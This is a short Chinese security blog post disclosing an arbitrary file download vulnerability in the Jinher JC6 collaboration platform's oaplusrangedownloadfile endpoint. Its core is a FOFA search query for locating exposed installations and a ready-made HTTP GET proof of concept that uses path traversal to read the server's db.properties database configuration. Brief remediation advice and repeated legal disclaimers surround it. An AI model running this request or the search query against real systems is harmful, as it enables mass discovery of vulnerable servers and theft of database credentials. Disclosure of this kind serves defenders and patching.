#  金和JC6协同管理平台 oaplusrangedownloadfile 任意文件下载漏洞   
 HK安全小屋   2025-05-06 15:12  
  
免责声明  
  
       请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
影响版本:  
  
金和JC6协同管理平台  
  
漏洞描述  
  
金和数字化智能办公平台（简称JC6）是一款结合了人工智能技术的数字化办公平台，为企业带来了智能化的办公体验和全面的数字化转型支持。金和JC6协同管理平台oaplusrangedownloadfile 存在文件下载漏洞，攻击者可利用该漏洞获取服务器敏感信息。  
  
FOFA:  
```
app="Jinher-OA"
```  
  
POC:  
```
GET /jc6/JHSoft.WCF/login/oaplusrangedownloadfile?filename=../WEB-INF/classes/db.properties HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Connection: close
```  
  
读取db.properties文件可以获取数据库配置信息  
  
![](https://mmbiz.qpic.cn/mmbiz_png/A8qcyicQXeI2mzZEEtwXs6vgpKdVVIJiaeKkgib3pKSduHoicPR1wkNyXghxk1DPAZARQwLTYJTrXoPcUVYkEG904A/640?wx_fmt=png&from=appmsg "")  
  
****  
**修复建议**  
  
1、关闭互联网暴露面或设置访问权限，禁止非管理IP访问对应页面。  
  
2、关注厂商升级至安全版本，  
  
3、及时联系官方获取更新补丁  
  
  
--------  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
  
  
